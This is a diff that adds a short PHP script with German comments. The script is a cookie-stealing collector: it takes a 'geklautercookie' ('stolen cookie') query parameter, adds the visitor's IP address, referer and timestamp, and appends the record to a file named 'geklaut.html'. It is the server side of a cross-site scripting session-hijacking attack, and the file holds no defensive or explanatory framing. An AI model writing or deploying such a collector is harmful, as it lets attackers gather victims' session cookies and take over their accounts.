@@ -1,0 +1,20 @@
+<?php
+
+   // Daten sammeln
+   $geklautercookie = $_GET["geklautercookie"];
+   $ip = getenv ("REMOTE_ADDR");
+   $referer = getenv("HTTP_REFERER");
+   $datum = date("j. F Y, H:i");
+   
+   // Eintrag zusammenstellen
+   $daten = "Cookie: ".$geklautercookie." <br>";
+   $daten = $daten."IP: ".$ip." <br>";
+   $daten = $daten."Referer: ".$referer." <br>";
+   $daten = $daten."Datum und Zeit: ".$datum." <br>";
+   $daten = $daten." <hr> <br>";
+   
+   // Eintrag in Datei schreiben
+   $datei = fopen("geklaut.html", "a+");
+   fwrite($datei, $daten);
+   fclose($datei);
+?>
